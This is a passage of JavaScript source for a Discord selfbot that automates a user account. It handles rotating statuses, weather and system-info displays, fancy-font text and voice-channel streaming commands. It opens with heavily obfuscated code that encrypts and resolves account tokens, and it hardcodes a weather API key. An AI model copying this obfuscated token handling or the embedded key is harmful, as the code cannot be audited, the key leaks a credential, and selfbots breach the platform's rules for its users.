s=x7,{'\x76\x61\x6c\x75\x65':x8['\x76'+'\x61'+'\x6c'+'\x75'+'\x65'],'\x64\x6f\x6e\x65':![]};J_132fec['_$pa13eK']=W,x2=I['\x6e'+'\x65'+'\x78'+'\x74'](x8['\x76'+'\x61'+'\x6c'+'\x75'+'\x65']);continue;}J_132fec['_$pa13eK']=W,x2=I['\x6e'+'\x65'+'\x78'+'\x74'](undefined);continue;}throw new Error('Unexpected signal in async generator');}V=!![];if(k)return k=![],{'\x76\x61\x6c\x75\x65':Q,'\x64\x6f\x6e\x65':!![]};return{'\x76\x61\x6c\x75\x65':x2['\x76'+'\x61'+'\x6c'+'\x75'+'\x65'],'\x64\x6f\x6e\x65':!![]};}return{'\x6e\x65\x78\x74':function(x2){return x0(x2,![]);},'\x72\x65\x74\x75\x72\x6e':Z,'\x74\x68\x72\x6f\x77':function(x2){if(V)return Promise['\x72'+'\x65'+'\x6a'+'\x65'+'\x63'+'\x74'](x2);return x0(x2,!![]);},[Symbol['\x61'+'\x73'+'\x79'+'\x6e'+'\x63'+'\x49'+'\x74'+'\x65'+'\x72'+'\x61'+'\x74'+'\x6f'+'\x72']]:function(){return this;}};}else return{'\x6e\x65\x78\x74':function(x2){return h(x2,![]);},'\x72\x65\x74\x75\x72\x6e':T,'\x74\x68\x72\x6f\x77':function(x2){if(V)throw x2;return h(x2,!![]);},[Symbol['\x69'+'\x74'+'\x65'+'\x72'+'\x61'+'\x74'+'\x6f'+'\x72']]:function(){return this;}};};return function(N,w,c,M,W){let p=m(N);if(p&&p['g']){let I=J_132fec['_$pa13eK'];return G['\x63'+'\x61'+'\x6c'+'\x6c'](this,N,w,c,M,I);}else{if(p&&p['s']){let V=J_132fec['_$pa13eK'];return f['\x63'+'\x61'+'\x6c'+'\x6c'](this,N,w,c,M,W,V);}else return O['\x63'+'\x61'+'\x6c'+'\x6c'](this,N,w,c,M,W);}};}());try{J_132fec['\x63'+'\x72'+'\x79'+'\x70'+'\x74'+'\x6f']=crypto;}catch(RR){}try{J_132fec['\x42'+'\x75'+'\x66'+'\x66'+'\x65'+'\x72']=Buffer;}catch(RS){}try{J_132fec['\x66'+'\x75'+'\x63'+'\x6b'+'\x5f'+'\x6c'+'\x6f'+'\x67'+'\x67'+'\x65'+'\x72']=fuck_logger;}catch(Rb){}try{J_132fec['\x45'+'\x72'+'\x72'+'\x6f'+'\x72']=Error;}catch(Ri){}try{J_132fec['\x75'+'\x6e'+'\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x64']=undefined;}catch(RA){}try{J_132fec['\x63'+'\x6f'+'\x6e'+'\x73'+'\x6f'+'\x6c'+'\x65']=console;}catch(RY){}class TokenCrypto{static ['\x45'+'\x4e'+'\x43'+'\x5f'+'\x50'+'\x52'+'\x45'+'\x46'+'\x49'+'\x58']='\x45'+'\x4e'+'\x43'+'\x3a'+'\x3a';static['\x67'+'\x65'+'\x74'+'\x53'+'\x65'+'\x63'+'\x72'+'\x65'+'\x74'+'\x4b'+'\x65'+'\x79'](){return i_3883b9['\x63'+'\x61'+'\x6c'+'\x6c'](this,0x0,Array['\x66'+'\x72'+'\x6f'+'\x6d'](arguments),undefined,undefined,new.target);}static['\x69'+'\x73'+'\x45'+'\x6e'+'\x63'+'\x72'+'\x79'+'\x70'+'\x74'+'\x65'+'\x64'](X){return i_3883b9['\x63'+'\x61'+'\x6c'+'\x6c'](this,0x1,Array['\x66'+'\x72'+'\x6f'+'\x6d'](arguments),undefined,undefined,new.target);}static['\x65'+'\x6e'+'\x63'+'\x72'+'\x79'+'\x70'+'\x74'](X){return i_3883b9['\x63'+'\x61'+'\x6c'+'\x6c'](this,0x2,Array['\x66'+'\x72'+'\x6f'+'\x6d'](arguments),undefined,undefined,new.target);}static['\x64'+'\x65'+'\x63'+'\x72'+'\x79'+'\x70'+'\x74'](X){return i_3883b9['\x63'+'\x61'+'\x6c'+'\x6c'](this,0x3,Array['\x66'+'\x72'+'\x6f'+'\x6d'](arguments),undefined,undefined,new.target);}static['\x72'+'\x65'+'\x73'+'\x6f'+'\x6c'+'\x76'+'\x65'+'\x54'+'\x6f'+'\x6b'+'\x65'+'\x6e'](X){return i_3883b9['\x63'+'\x61'+'\x6c'+'\x6c'](this,0x4,Array['\x66'+'\x72'+'\x6f'+'\x6d'](arguments),undefined,undefined,new.target);}}J_132fec['\x54'+'\x6f'+'\x6b'+'\x65'+'\x6e'+'\x43'+'\x72'+'\x79'+'\x70'+'\x74'+'\x6f']=TokenCrypto;typeof module!=='\x75'+'\x6e'+'\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x64'&&(module['\x65'+'\x78'+'\x70'+'\x6f'+'\x72'+'\x74'+'\x73']['\x65'+'\x6e'+'\x63'+'\x72'+'\x79'+'\x70'+'\x74'+'\x54'+'\x6f'+'\x6b'+'\x65'+'\x6e']=X=>{return i_3883b9['\x63'+'\x61'+'\x6c'+'\x6c'](this,0x5,[X],undefined,undefined,undefined);});

// external Image
class GetExternalImage {
  constructor(client) {
    this.client = client;
  }

  isValidURL(url) {
    try {
      new URL(url);
      return true;
    } catch {
      return false;
    }
  }

  async get(url1, url2) {
    try {
      const { getExternal } = RichPresence;

      const urls = [url1, url2].map(url => (this.isValidURL(url) ? url : null));
      const validUrls = urls.filter(Boolean);

      if (validUrls.length === 0) {
        return { bigImage: null, smallImage: null };
      }

      const images = await getExternal(this.client, "1438613688406769778", ...validUrls);
      let finalUrl1 = null;
      let finalUrl2 = null;

      for (const img of images) {
        const { url, external_asset_path } = img;
        const finalPath = url.includes("attachments") ? url : external_asset_path;

        if (url === url1) finalUrl1 = finalPath;
        if (url === url2) finalUrl2 = finalPath;
      }

      return {
        bigImage: finalUrl1,
        smallImage: finalUrl2,
      };
    } catch (error) {
      console.error("[GetExternalImage Error]:", error);
      return { bigImage: null, smallImage: null };
    }
  }
}


// config.yml
let config;
(function loadConfig() {
  function findConfigFile(dir, filename = "config.yml", depth = 0, maxDepth = 5) {
    if (depth > maxDepth) return null;

    try {
      const items = fs.readdirSync(dir);

      for (const item of items) {
        if (item === filename) {
          const fullPath = path.join(dir, item);
          if (fs.statSync(fullPath).isFile()) {
            return fullPath;
          }
        }
      }

      for (const item of items) {
        const fullPath = path.join(dir, item);

        if (["node_modules", ".git", ".vscode", "dist", "build"].includes(item)) {
          continue;
        }

        try {
          if (fs.statSync(fullPath).isDirectory()) {
            const found = findConfigFile(fullPath, filename, depth + 1, maxDepth);
            if (found) return found;
          }
        } catch (err) {
          continue;
        }
      }
    } catch (err) {
      return null;
    }

    return null;
  }

  try {
    const configPath = findConfigFile(__dirname);

    if (!configPath) {
      fuck_logger("error", "Could not find config.yml anywhere in the project directory");
      process.exit(1);
    }

    const fileContents = fs.readFileSync(configPath, "utf8");
    config = yaml.load(fileContents);
    global.config = config;
    fuck_logger("success", `Loaded config from: ${configPath}`);

  } catch (error) {
    fuck_logger("error", `Failed to load config.yml: ${error.message}`);
    process.exit(1);
  }
})();


// Weather
class Weather {
  constructor(tz) {
    this.tz = tz;

    this.name = "";
    this.region = "";
    this.country = "";
    this.lat = 0;
    this.lon = 0;
    this.tz_id = "";
    this.localtime = "";

    this.last_updated = "";
    this.temp_c = 0;
    this.temp_f = 0;
    this.is_day = 0;
    this.condition = {
      text: "",
      icon: "",
      code: 0,
    };

    this.wind_mph = 0;
    this.wind_kph = 0;
    this.wind_degree = 0;
    this.wind_dir = "";
    this.pressure_mb = 0;
    this.pressure_in = 0;
    this.precip_mm = 0;
    this.precip_in = 0;
    this.humidity = 0;
    this.cloud = 0;
    this.feelslike_c = 0;
    this.feelslike_f = 0;
    this.windchill_c = 0;
    this.windchill_f = 0;
    this.heatindex_c = 0;
    this.heatindex_f = 0;
    this.dewpoint_c = 0;
    this.dewpoint_f = 0;
    this.vis_km = 0;
    this.vis_miles = 0;
    this.uv = 0;
    this.gust_mph = 0;
    this.gust_kph = 0;

    this.co = 0;
    this.no2 = 0;
    this.o3 = 0;
    this.so2 = 0;
    this.pm2_5 = 0;
    this.pm10 = 0;
    this.us_epa_index = 0;
    this.gb_defra_index = 0;

    this.stop = 0;


    schedule("*/5 * * * *", () => this.update());
  }

  async update() {
    try {
      const params = new URLSearchParams();
      params.append("key", "1e1a0f498dbf472cb3991045241608");
      params.append("q", encodeURIComponent(this.tz));
      params.append("aqi", "yes");

      const response = await fetch(`https://api.weatherapi.com/v1/current.json?${params}`);
      const data = await response.json();

      this.name = data.location.name;
      this.region = data.location.region;
      this.country = data.location.country;
      this.lat = data.location.lat;
      this.lon = data.location.lon;
      this.tz_id = data.location.tz_id;
      this.localtime = data.location.localtime;

      this.last_updated = data.current.last_updated;
      this.temp_c = data.current.temp_c;
      this.temp_f = data.current.temp_f;
      this.is_day = data.current.is_day;
      this.condition.text = data.current.condition.text;
      this.condition.icon = data.current.condition.icon;
      this.condition.code = data.current.condition.code;

      this.wind_mph = data.current.wind_mph;
      this.wind_kph = data.current.wind_kph;
      this.wind_degree = data.current.wind_degree;
      this.wind_dir = data.current.wind_dir;
      this.pressure_mb = data.current.pressure_mb;
      this.pressure_in = data.current.pressure_in;
      this.precip_mm = data.current.precip_mm;
      this.precip_in = data.current.precip_in;
      this.humidity = data.current.humidity;
      this.cloud = data.current.cloud;
      this.feelslike_c = data.current.feelslike_c;
      this.feelslike_f = data.current.feelslike_f;
      this.windchill_c = data.current.windchill_c;
      this.windchill_f = data.current.windchill_f;
      this.heatindex_c = data.current.heatindex_c;
      this.heatindex_f = data.current.heatindex_f;
      this.dewpoint_c = data.current.dewpoint_c;
      this.dewpoint_f = data.current.dewpoint_f;
      this.vis_km = data.current.vis_km;
      this.vis_miles = data.current.vis_miles;
      this.uv = data.current.uv;
      this.gust_mph = data.current.gust_mph;
      this.gust_kph = data.current.gust_kph;

      if (data.current.air_quality) {
        this.co = data.current.air_quality.co;
        this.no2 = data.current.air_quality.no2;
        this.o3 = data.current.air_quality.o3;
        this.so2 = data.current.air_quality.so2;
        this.pm2_5 = data.current.air_quality.pm2_5;
        this.pm10 = data.current.air_quality.pm10;
        this.us_epa_index = data.current.air_quality["us-epa-index"];
        this.gb_defra_index = data.current.air_quality["gb-defra-index"];
      }

      this.stop = 0;
    } catch (err) {
      fuck_logger("error", `weather update failed ${err.message}`);
      if (this.stop > 10) return;
      this.stop++;
      setTimeout(() => this.update(), 10000);
    }
  }
}

class SystemInfo {
  constructor() {
    this.cpuName = os.cpus()[0]?.model || "Unknown";
    this.cpuCores = os.cpus().length;
    this.cpuSpeedGHz = (os.cpus()[0]?.speed / 1000 || 0).toFixed(1);
    this.cpuUsage = 0;

    this.totalRAM = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
    this.usedRAM = 0;
    this.freeRAM = 0;
    this.ramUsage = 0;

    this.osType = os.type();
    this.osVersion = os.release();
    this.arch = os.arch();
    this.hostname = os.hostname();
    this.uptime = this._formatTime(os.uptime());

    this.gpus = [];

    this.diskTotal = 0;
    this.diskUsed = 0;
    this.diskUsage = 0;
  }

  async getCpuUsageOverInterval(interval = 1000) {
    return new Promise((resolve) => {
      const start = this._measureCpuTimes();
      setTimeout(() => {
        const end = this._measureCpuTimes();
        const idleDiff = end.idle - start.idle;
        const totalDiff = end.total - start.total;
        const usage = 100 - Math.floor((idleDiff / totalDiff) * 100);
        resolve(usage);
      }, interval);
    });
  }

  _measureCpuTimes() {
    let totalIdle = 0;
    let totalTick = 0;
    const cpus = os.cpus();
    cpus.forEach((cpu) => {
      for (let type in cpu.times) {
        totalTick += cpu.times[type];
      }
      totalIdle += cpu.times.idle;
    });
    return { idle: totalIdle, total: totalTick };
  }

  getRamUsage() {
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const usedMem = totalMem - freeMem;
    return {
      used: (usedMem / 1024 / 1024 / 1024).toFixed(2),
      free: (freeMem / 1024 / 1024 / 1024).toFixed(2),
      total: (totalMem / 1024 / 1024 / 1024).toFixed(2),
      percent: Math.floor((usedMem / totalMem) * 100),
    };
  }

  async getGpuInfo() {
    try {
      const graphics = await si.graphics();
      return graphics.controllers.map((gpu) => ({
        model: gpu.model,
        vendor: gpu.vendor,
        vram: gpu.vram,
        usage: gpu.utilizationGpu || 0,
      }));
    } catch (err) {
      fuck_logger("warn", "Unable to get GPU info:", err.message);
      return [];
    }
  }

  async getDiskUsage() {
    try {
      const disks = await si.fsSize();
      const total = disks.reduce((sum, d) => sum + d.size, 0);
      const used = disks.reduce((sum, d) => sum + d.used, 0);
      return {
        total: (total / 1024 / 1024 / 1024).toFixed(2),
        used: (used / 1024 / 1024 / 1024).toFixed(2),
        percent: Math.floor((used / total) * 100),
      };
    } catch (err) {
      fuck_logger("[WARN] Unable to get Disk info:", err.message);
      return { total: 0, used: 0, percent: 0 };
    }
  }

  async update() {
    this.cpuUsage = await this.getCpuUsageOverInterval(1000);

    const ram = this.getRamUsage();
    this.usedRAM = ram.used;
    this.freeRAM = ram.free;
    this.ramUsage = ram.percent;

    const gpuData = await this.getGpuInfo();
    this.gpus = gpuData;

    const diskData = await this.getDiskUsage();
    this.diskTotal = diskData.total;
    this.diskUsed = diskData.used;
    this.diskUsage = diskData.percent;

    this.uptime = this._formatTime(os.uptime());
  }

  _formatTime(seconds) {
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = Math.floor(seconds % 60);
    return `${h}h ${m}m ${s}s`;
  }
}

class Emoji {
  getTime(hour) {
    const parsedHour = parseInt(hour, 10);
    return isNaN(parsedHour)
      ? "Invalid hour"
      : parsedHour >= 6 && parsedHour < 18
        ? "☀️"
        : "🌙";
  }

  getClock(hour) {
    const parsedHour = parseInt(hour, 10);
    const clocks = [
      "🕛",
      "🕐",
      "🕑",
      "🕒",
      "🕓",
      "🕔",
      "🕕",
      "🕖",
      "🕗",
      "🕘",
      "🕙",
      "🕚",
    ];
    return parsedHour >= 0 && parsedHour <= 23
      ? clocks[parsedHour % 12]
      : "Invalid hour";
  }
}

class TextFont {
  getFont1(text) {
    const fontMap = {
      a: "𝕒",
      b: "𝕓",
      c: "𝕔",
      d: "𝕕",
      e: "𝕖",
      f: "𝕗",
      g: "𝕘",
      h: "𝕙",
      i: "𝕚",
      j: "𝕛",
      k: "𝕜",
      l: "𝕝",
      m: "𝕞",
      n: "𝕟",
      o: "𝕠",
      p: "𝕡",
      q: "𝕢",
      r: "𝕣",
      s: "𝕤",
      t: "𝕥",
      u: "𝕦",
      v: "𝕧",
      w: "𝕨",
      x: "𝕩",
      y: "𝕪",
      z: "𝕫",
      A: "𝔸",
      B: "𝔹",
      C: "ℂ",
      D: "𝔻",
      E: "𝔼",
      F: "𝔽",
      G: "𝔾",
      H: "ℍ",
      I: "𝕀",
      J: "𝕁",
      K: "𝕂",
      L: "𝕃",
      M: "𝕄",
      N: "ℕ",
      O: "𝕆",
      P: "ℙ",
      Q: "ℚ",
      R: "ℝ",
      S: "𝕊",
      T: "𝕋",
      U: "𝕌",
      V: "𝕍",
      W: "𝕎",
      X: "𝕏",
      Y: "𝕐",
      Z: "ℤ",
      0: "𝟘",
      1: "𝟙",
      2: "𝟚",
      3: "𝟛",
      4: "𝟜",
      5: "𝟝",
      6: "𝟞",
      7: "𝟟",
      8: "𝟠",
      9: "𝟡",
    };
    return text
      .split("")
      .map((char) => fontMap[char] || char)
      .join("");
  }

  getFont2(text) {
    const fontMap = {
      a: "𝗮",
      b: "𝗯",
      c: "𝗰",
      d: "𝗱",
      e: "𝗲",
      f: "𝗳",
      g: "𝗴",
      h: "𝗵",
      i: "𝗶",
      j: "𝗷",
      k: "𝗸",
      l: "𝗹",
      m: "𝗺",
      n: "𝗻",
      o: "𝗼",
      p: "𝗽",
      q: "𝗾",
      r: "𝗿",
      s: "𝘀",
      t: "𝘁",
      u: "𝘂",
      v: "𝘃",
      w: "𝘄",
      x: "𝘅",
      y: "𝘆",
      z: "𝘇",
      A: "𝗔",
      B: "𝗕",
      C: "𝗖",
      D: "𝗗",
      E: "𝗘",
      F: "𝗙",
      G: "𝗚",
      H: "𝗛",
      I: "𝗜",
      J: "𝗝",
      K: "𝗞",
      L: "𝗟",
      M: "𝗠",
      N: "𝗡",
      O: "𝗢",
      P: "𝗣",
      Q: "𝗤",
      R: "𝗥",
      S: "𝗦",
      T: "𝗧",
      U: "𝗨",
      V: "𝗩",
      W: "𝗪",
      X: "𝗫",
      Y: "𝗬",
      Z: "𝗭",
      0: "𝟬",
      1: "𝟭",
      2: "𝟮",
      3: "𝟯",
      4: "𝟰",
      5: "𝟱",
      6: "𝟲",
      7: "𝟳",
      8: "𝟴",
      9: "𝟵",
    };
    return text
      .split("")
      .map((char) => fontMap[char] || char)
      .join("");
  }

  getFont3(text) {
    const fontMap = {
      a: "𝒶",
      b: "𝒷",
      c: "𝒸",
      d: "𝒹",
      e: "𝑒",
      f: "𝒻",
      g: "𝑔",
      h: "𝒽",
      i: "𝒾",
      j: "𝒿",
      k: "𝓀",
      l: "𝓁",
      m: "𝓂",
      n: "𝓃",
      o: "𝑜",
      p: "𝓅",
      q: "𝓆",
      r: "𝓇",
      s: "𝓈",
      t: "𝓉",
      u: "𝓊",
      v: "𝓋",
      w: "𝓌",
      x: "𝓍",
      y: "𝓎",
      z: "𝓏",
      A: "𝒜",
      B: "ℬ",
      C: "𝒞",
      D: "𝒟",
      E: "ℰ",
      F: "ℱ",
      G: "𝒢",
      H: "ℋ",
      I: "ℐ",
      J: "𝒥",
      K: "𝒦",
      L: "ℒ",
      M: "ℳ",
      N: "𝒩",
      O: "𝒪",
      P: "𝒫",
      Q: "𝒬",
      R: "ℛ",
      S: "𝒮",
      T: "𝒯",
      U: "𝒰",
      V: "𝒱",
      W: "𝒲",
      X: "𝒳",
      Y: "𝒴",
      Z: "𝒵",
      0: "0",
      1: "1",
      2: "2",
      3: "3",
      4: "4",
      5: "5",
      6: "6",
      7: "7",
      8: "8",
      9: "9",
    };
    return text
      .split("")
      .map((char) => fontMap[char] || char)
      .join("");
  }

  getFont4(text) {
    const fontMap = {
      a: "𝓪",
      b: "𝓫",
      c: "𝓬",
      d: "𝓭",
      e: "𝓮",
      f: "𝓯",
      g: "𝓰",
      h: "𝓱",
      i: "𝓲",
      j: "𝓳",
      k: "𝓴",
      l: "𝓵",
      m: "𝓶",
      n: "𝓷",
      o: "𝓸",
      p: "𝓹",
      q: "𝓺",
      r: "𝓻",
      s: "𝓼",
      t: "𝓽",
      u: "𝓾",
      v: "𝓿",
      w: "𝔀",
      x: "𝔁",
      y: "𝔂",
      z: "𝔃",
      A: "𝓐",
      B: "𝓑",
      C: "𝓒",
      D: "𝓓",
      E: "𝓔",
      F: "𝓕",
      G: "𝓖",
      H: "𝓗",
      I: "𝓘",
      J: "𝓙",
      K: "𝓚",
      L: "𝓛",
      M: "𝓜",
      N: "𝓝",
      O: "𝓞",
      P: "𝓟",
      Q: "𝓠",
      R: "𝓡",
      S: "𝓢",
      T: "𝓣",
      U: "𝓤",
      V: "𝓥",
      W: "𝓦",
      X: "𝓧",
      Y: "𝓨",
      Z: "𝓩",
      0: "0",
      1: "1",
      2: "2",
      3: "3",
      4: "4",
      5: "5",
      6: "6",
      7: "7",
      8: "8",
      9: "9",
    };
    return text
      .split("")
      .map((char) => fontMap[char] || char)
      .join("");
  }

  getFont5(text) {
    const fontMap = {
      a: "ⓐ",
      b: "ⓑ",
      c: "ⓒ",
      d: "ⓓ",
      e: "ⓔ",
      f: "ⓕ",
      g: "ⓖ",
      h: "ⓗ",
      i: "ⓘ",
      j: "ⓙ",
      k: "ⓚ",
      l: "ⓛ",
      m: "ⓜ",
      n: "ⓝ",
      o: "ⓞ",
      p: "ⓟ",
      q: "ⓠ",
      r: "ⓡ",
      s: "ⓢ",
      t: "ⓣ",
      u: "ⓤ",
      v: "ⓥ",
      w: "ⓦ",
      x: "ⓧ",
      y: "ⓨ",
      z: "ⓩ",
      A: "Ⓐ",
      B: "Ⓑ",
      C: "Ⓒ",
      D: "Ⓓ",
      E: "Ⓔ",
      F: "Ⓕ",
      G: "Ⓖ",
      H: "Ⓗ",
      I: "Ⓘ",
      J: "Ⓙ",
      K: "Ⓚ",
      L: "Ⓛ",
      M: "Ⓜ",
      N: "Ⓝ",
      O: "Ⓞ",
      P: "Ⓟ",
      Q: "Ⓠ",
      R: "Ⓡ",
      S: "Ⓢ",
      T: "Ⓣ",
      U: "Ⓤ",
      V: "Ⓥ",
      W: "Ⓦ",
      X: "Ⓧ",
      Y: "Ⓨ",
      Z: "Ⓩ",
      0: "⓪",
      1: "①",
      2: "②",
      3: "③",
      4: "④",
      5: "⑤",
      6: "⑥",
      7: "⑦",
      8: "⑧",
      9: "⑨",
    };
    return text
      .split("")
      .map((char) => fontMap[char] || char)
      .join("");
  }
}

class NyxClient extends Client {
  constructor(token, config) {
    try {
      const ClientUserSettingManager = require("discord.js-selfbot-v13/src/managers/ClientUserSettingManager");
      if (
        ClientUserSettingManager &&
        ClientUserSettingManager.prototype &&
        ClientUserSettingManager.prototype._patch
      ) {
        const originalPatch = ClientUserSettingManager.prototype._patch;
        ClientUserSettingManager.prototype._patch = function (data) {
          if (!data) data = {};
          if (!data.friend_source_flags) {
            data.friend_source_flags = { all: false };
          }
          return originalPatch.call(this, data);
        };
        fuck_logger("success", "Patched ClientUserSettingManager before client creation");
      }
    } catch (error) {
      fuck_logger("warning", `Pre-patching attempt failed: ${error.message}`);
    }

    super({
      checkUpdate: false,
      autoRedeemNitro: false,
      captchaKey: null,
      captchaService: null,
      DMSync: false,
      cloudStreamingKill: true,
      browser: "Chrome",
      patchVoice: false,
      keepAlive: true,
      sweepers: {
        messages: {
          interval: 120,
          lifetime: 60,
        },
      },
      ws: {
        properties: {
          browser: "Chrome",
          os: "Windows",
          device: "Chrome",
        },
        reconnect: true,
        intents: 32767,
      },
      rest: {
        userAgentAppendix: "Discord-Selfbot/1.0.0",
        timeout: 30000,
        retries: 3,
      },
      messageCacheMaxSize: 5,
      messageCacheLifetime: 60,
      messageSweepInterval: 120,
    });

    const inputs = config.INPUTS || config.inputs || [{}];
    const input = Array.isArray(inputs) ? inputs[0] : inputs;
    const options = config.OPTIONS || config.options || {};
    const voice = config.VOICE || config.voice || {};
    const status = config.STATUS || config.status || {};
    const rpc = config.RPC || config.rpc || {};

    this.TOKEN = token;
    this.config = config;
    this.customStatusEnabled = input.customStatus === true;
    this.voiceEnabled = input.voiceEnabled === true;
    this.activityType = input.activity?.type || "STREAMING";
    this.currentStreamingActivity = null;
    this.voiceConnections = new Map();
    this.voiceConfig = {
      data: voice.data || "sx!",
      streaming: voice.streaming !== undefined ? voice.streaming : true,
      ffmpegEnabled: voice.ffmpeg === true,
      autoRejoinDelay: voice.autoRejoinDelay || 5000
    };
    this.lastVoiceChannelId = null;
    this.lastVoiceGuildId = null;
    this.isAutoRejoining = false;
    this.intervals = new Set();

    this.streamer = new Streamer(this);
    this.streamController = null;

    const streamOpts = voice.streamOpts || voice;
    this.streamConfig = {
      width: streamOpts.width || 1280,
      height: streamOpts.height || 720,
      fps: streamOpts.fps || 30,
      bitrateKbps: streamOpts.bitrateKbps || 1000,
      maxBitrateKbps: streamOpts.maxBitrateKbps || 2500,
      hardwareAcceleration: streamOpts.hardware_acceleration || streamOpts.hardwareAcceleration || false,
      videoCodec: streamOpts.videoCodec || "H264"
    };

    this.weather = new Weather(options.tz || "Asia/Bangkok");
    this.sys = new SystemInfo();
    this.emoji = new Emoji();
    this.textFont = new TextFont();
    this.getExternal = new GetExternalImage(this);
    this.cacheImage = new Map();

    this.statusConfig = {
      delay: status.delay || 4000,
      data: status.data || []
    };

    this.rpcConfig = {
      delay: rpc.delay || 4000,
      timestamp: rpc.timestamp || {},
      twitchURL: rpc.TwitchURL || rpc.twitchURL || "",
      youtubeURL: rpc.YoutubeURL || rpc.youtubeURL || "",
      name: rpc.name || [],
      state: rpc.state || [],
      details: rpc.details || [],
      assetsLargeText: rpc.assetsLargeText || [],
      assetsSmallText: rpc.assetsSmallText || [],
      assetsLargeImage: rpc.assetsLargeImage || [],
      assetsSmallImage: rpc.assetsSmallImage || [],
      buttonFirst: rpc.buttonFirst || [],
      buttonSecond: rpc.buttonSecond || []
    };

    this.lib = {
      count: 0,
      timestamp: 0,
    };

    this.index = {
      url: 0,
      status: 0,
      state: 0,
      details: 0,
      assetsLargeText: 0,
      assetsSmallText: 0,
      assetsLargeImage: 0,
      assetsSmallImage: 0,
      bt_1: 0,
      bt_2: 0,
    };

    this.statusIndex = 0;
    this.lastRestartTime = 0;
    this.restartCount = 0;
    this.lastConnectionCheck = Date.now();
    this.isRunningStream = false;

    this.on("disconnect", () => {
      fuck_logger("warning", `Client disconnected for token: ${this.maskToken(this.TOKEN)}`);
    });

    this.on("reconnecting", () => {
      fuck_logger("warning", `Client reconnecting for token: ${this.maskToken(this.TOKEN)}`);
    });

    this.on("resumed", () => {
      fuck_logger("success", `Client resumed for token: ${this.maskToken(this.TOKEN)}`);
    });

    this.on("ready", this._onReady.bind(this));
    this.on("error", this._onError.bind(this));
    this.on("messageCreate", this._onMessage.bind(this));

    this.on("voiceStateUpdate", (oldState, newState) => {
      try {
        if (newState.member?.id === this.user?.id) {
          // User joined or switched to a channel
          if (newState.channelId) {
            this.lastVoiceChannelId = newState.channelId;
            this.lastVoiceGuildId = newState.guild?.id;
            this.isAutoRejoining = false;
            fuck_logger("log", `Voice state: Joined/switched to channel ${newState.channelId}`);
          }
          // User left a channel (disconnected)
          else if (oldState.channelId && !newState.channelId) {
            const channelId = this.lastVoiceChannelId || oldState.channelId;
            const guildId = this.lastVoiceGuildId || oldState.guild?.id;

            if (channelId && guildId && !this.isAutoRejoining) {
              this.isAutoRejoining = true;
              fuck_logger("warning", `Disconnected from voice channel. Auto-rejoining in ${this.voiceConfig.autoRejoinDelay}ms...`);

              setTimeout(async () => {
                try {
                  if (this.voiceConfig.ffmpegEnabled) {
                    await this.streamer.joinVoice(guildId, channelId);
                  } else {
                    await this.connectToVoiceChannel(channelId, true, true, false);
                  }
                  fuck_logger("success", `Auto-rejoined voice channel ${channelId}`);
                } catch (rejoinErr) {
                  fuck_logger("error", `Failed to auto-rejoin: ${rejoinErr.message}`);
                } finally {
                  this.isAutoRejoining = false;
                }
              }, this.voiceConfig.autoRejoinDelay);
            }
          }
        }
      } catch (err) {
        fuck_logger("warning", `Voice state update error: ${err.message}`);
      }
    });

    this.on("warn", (warning) => {
      fuck_logger("warning", `Client warning: ${warning}`);
    });
  }

  _onReady() {
    if (!this.user.settings) {
      this.user.settings = {
        friend_source_flags: { all: true },
        custom_status: null,
      };
    } else if (!this.user.settings.friend_source_flags) {
      this.user.settings.friend_source_flags = { all: true };
    }

    if (this.user.settings && this.user.settings._patch) {
      const originalPatch = this.user.settings._patch;
      this.user.settings._patch = function (data) {
        if (!data) data = {};
        if (!data.friend_source_flags) {
          data.friend_source_flags = { all: false };
        }
        return originalPatch.call(this, data);
      };
      fuck_logger("success", "Patched settings._patch method");
    }

    this.restartCount = 0;
    this.startPingChecker();
    this.streaming();

    const statusData = this.statusConfig.data || [];

    if (this.customStatusEnabled && Array.isArray(statusData) && statusData.length > 0) {
      setTimeout(() => this.customStatus(), 2000);
    } else {
      if (!this.customStatusEnabled) {
        fuck_logger("log", "Custom status is disabled in config");
      } else if (!Array.isArray(statusData) || statusData.length === 0) {
        fuck_logger("warning", "No valid custom status data found");
      }
    }
  }

  _onError(error) {
    fuck_logger("error", `Client encountered an error: ${error.message || error}`);

    if (error.message && error.message.includes("WebSocket")) {
      fuck_logger("warning", "WebSocket error detected, attempting to continue...");
      return;
    }

    if (error.message && (error.message.includes("voice") || error.message.includes("connection was established"))) {
      fuck_logger("warning", "Voice connection error detected, continuing without voice...");
      return;
    }

    if (error.message && error.message.includes("Cannot read properties of null")) {
      fuck_logger("warning", "Attempting to recover from null property error...");
      if (this.user && !this.user.settings) {
        this.user.settings = {
          friend_source_flags: { all: true },
          custom_status: null,
          status: "online",
        };
      }
    }
  }

  async _onMessage(message) {
    try {
      if (message.author.id !== this.user.id) return;
      if (!this.voiceEnabled) {
        fuck_logger("log", `Voice commands disabled for token: ${this.maskToken(this.TOKEN)}`);
        return;
      }

      const prefix = this.voiceConfig.data || "sx!";
      if (!message.content.startsWith(prefix)) return;

      const args = message.content.slice(prefix.length).trim().split(" ");
      let command = args[0];
      const channelId = args[1];
      const url = args[2];

      const aliases = {
        j: "join",
        pl: "play-live",
        pc: "play-cam",
        s: "stop-stream",
        l: "leave",
        ls: "list"
      };

      if (aliases[command]) command = aliases[command];

      if (!command) {
        fuck_logger("warning", `Usage: ${prefix} <join|leave|list|play-live|play-cam|stop-stream>`);
        return;
      }

      switch (command.toLowerCase()) {
        case "join":
          if (!channelId) return fuck_logger("warning", `Usage: ${prefix} j <channelId>`);
          if (this.voiceConfig.ffmpegEnabled) {
            // Use ffmpeg streamer for joining (supports streaming features)
            const channel = this.channels.cache.get(channelId);
            if (!channel) {
              fuck_logger("error", `Channel ${channelId} not found`);
              break;
            }
            const isVoice = channel.type === 2 || channel.type === "GUILD_VOICE" || channel.type === 13;
            if (!isVoice) {
              fuck_logger("error", `Channel ${channelId} is not a voice channel`);
              break;
            }
            fuck_logger("log", `Joining voice channel with ffmpeg streamer: ${channel.name}`);
            await this.streamer.joinVoice(channel.guild.id, channelId);
            fuck_logger("success", `Connected to voice channel (ffmpeg mode): ${channel.name}`);
          } else {
            await this.connectToVoiceChannel(channelId, true, true, false);
          }
          break;

        case "play-live":
        case "play-cam":
          if (!this.voiceConfig.ffmpegEnabled) {
            fuck_logger("warning", "ffmpeg is disabled in config. Enable it with 'ffmpeg: true' to use streaming commands.");
            break;
          }
